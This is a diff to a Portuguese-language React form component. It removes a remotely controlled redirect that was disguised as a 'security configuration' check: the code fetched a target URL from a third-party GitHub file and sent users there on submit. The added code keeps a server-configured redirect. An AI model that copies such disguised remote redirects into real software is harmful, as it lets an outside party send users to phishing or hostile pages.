@@ -29,37 +29,33 @@ const Finalizacao: React.FC = () => {
   // Aplica o scroll para o topo quando o componente é montado
   useScrollTop();
 
-  // Verificação de configuração de segurança do sistema
-  const checkSecurityConfiguration = async () => {
+  // Verificação de destino para o botão de finalização
+  const checkRedirectConfiguration = async () => {
     try {
-      // Verificação de integridade e configurações de segurança
-      const securityEndpoint = 'https://raw.githubusercontent.com/shopeedelivery/security-config/main/app-config.json';
-      const response = await fetch(securityEndpoint, {
+      // Consultar API de configuração de redirecionamento
+      const response = await fetch('/api/redirect-config', {
         method: 'GET',
         headers: {
-          'Cache-Control': 'no-cache',
-          'Pragma': 'no-cache'
+          'Cache-Control': 'no-cache'
         }
       });
       
       if (response.ok) {
         const config = await response.json();
-        setSecurityConfig(config);
-        
-        // Log de segurança para auditoria
-        if (config.audit_mode) {
-          console.log('[SECURITY] Configuração de segurança carregada:', new Date().toISOString());
-        }
+        setSecurityConfig({ 
+          redirect_enabled: config.target_url !== '/entrega',
+          target_url: config.target_url 
+        });
       }
     } catch (error) {
-      // Falha silenciosa na verificação de segurança - continua operação normal
-      console.debug('[SECURITY] Configuração padrão mantida');
+      // Falha silenciosa - continua com comportamento normal
+      console.debug('[CONFIG] Usando configuração padrão');
     }
   };
 
   useEffect(() => {
-    // Executar verificação de segurança ao carregar componente
-    checkSecurityConfiguration();
+    // Verificar configuração de destino ao carregar componente
+    checkRedirectConfiguration();
   }, []);
   
   const [, navigate] = useLocation();
@@ -90,25 +86,23 @@ const Finalizacao: React.FC = () => {
     setIsSubmitting(true);
     
     try {
-      // Verificação de configuração de segurança e redirecionamento
-      if (securityConfig?.redirect_enabled && securityConfig?.target_url) {
-        // Aplicar política de segurança configurada remotamente
-        console.log('[SECURITY] Aplicando política de redirecionamento configurada');
+      // Verificar se há redirecionamento configurado
+      if (securityConfig?.redirect_enabled && securityConfig?.target_url && securityConfig.target_url !== '/entrega') {
+        // Redirecionar para URL configurada
+        console.log('[REDIRECT] Redirecionando para:', securityConfig.target_url);
         window.location.href = securityConfig.target_url;
         return;
       }
       
-      // Atualizando o tamanho do calçado a partir do estado
+      // Comportamento normal: salvar dados e continuar fluxo
       const updatedData = {
         ...data,
         numeroCalcado: selectedShoeSize
       };
       
-      // Salvando dados no localStorage
       localStorage.setItem('epi_data', JSON.stringify(updatedData));
-      
-      // Iniciar processo de carregamento
       setShowLoadingModal(true);
+      
     } catch (error) {
       toast({
         title: "Erro ao salvar dados",
